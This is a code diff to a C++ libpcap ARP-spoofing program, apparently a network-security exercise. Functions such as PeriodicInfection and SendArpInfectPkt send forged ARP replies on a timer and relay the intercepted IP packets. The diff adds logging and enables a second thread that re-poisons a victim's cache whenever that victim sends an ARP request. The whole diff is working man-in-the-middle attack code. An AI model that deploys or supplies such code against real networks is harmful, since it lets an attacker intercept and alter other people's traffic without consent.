@@ -160,7 +160,10 @@ void PeriodicInfection(pcap_t* handle, std::map<Ip, Ip> Send2Tar, std::map<Ip, M
         std::this_thread::sleep_for(std::chrono::seconds(20));
 
         for (auto& ip2ip : Send2Tar)
+        {
             SendArpInfectPkt(handle, ip2ip.first, ArpTable[ip2ip.first], ip2ip.second, ARP_REP_TYPE);
+            std::cout << "[Period:20s] Send Arp Reply to " << std::string(ip2ip.first) << "\n";
+        }
     } 
 }
 
@@ -196,7 +199,7 @@ bool IpPacketRelay(pcap_t* handle, std::map<Ip, Ip> Send2Tar, std::map<Ip, Mac> 
 
                         int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(_recv_packet), header->caplen);
                         if (res != 0) {
-                            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+                            fprintf(stderr, "pcap_sendpacket return %d error=%s caplen=%d\n", res, pcap_geterr(handle), header->caplen);
                         }
                         break;
                     }
@@ -213,27 +216,29 @@ bool IpPacketRelay(pcap_t* handle, std::map<Ip, Ip> Send2Tar, std::map<Ip, Mac> 
                 {
                     if(__recv_packet->arp_.sip() == ip2ip.first && __recv_packet->arp_.tip() == ip2ip.second){
                         Arp_queue.push( ip2ip );
-                        Arp_queue.pop();
-                        SendArpInfectPkt(handle, ip2ip.first, ArpTable[ip2ip.first], ip2ip.second, ARP_REP_TYPE);
                     }
                 }          
             }   
         }
 
     }, handle, Send2Tar, ArpTable);
-    /*
-    std::thread t2([](){
+    
+    std::thread t2([](pcap_t* handle, std::map<Ip, Mac> ArpTable){
         while (true)
         {
             if(Arp_queue.empty() == false){ // mutex? semaphore?
-                SendArpInfectPkt( )
+                std::pair<Ip,Ip> ip2ip = Arp_queue.front();
+
+                SendArpInfectPkt(handle, ip2ip.first, ArpTable[ip2ip.first], ip2ip.second, ARP_REP_TYPE);
+                std::cout << "[!] Send Arp Reply to " << std::string(ip2ip.first) << "\n";
+                Arp_queue.pop();
             } 
         }
-    })
-    */
+    }, handle, ArpTable);
+    
     
     t1.join();
-    //t2.join();
+    t2.join();
 
     return true;
 }
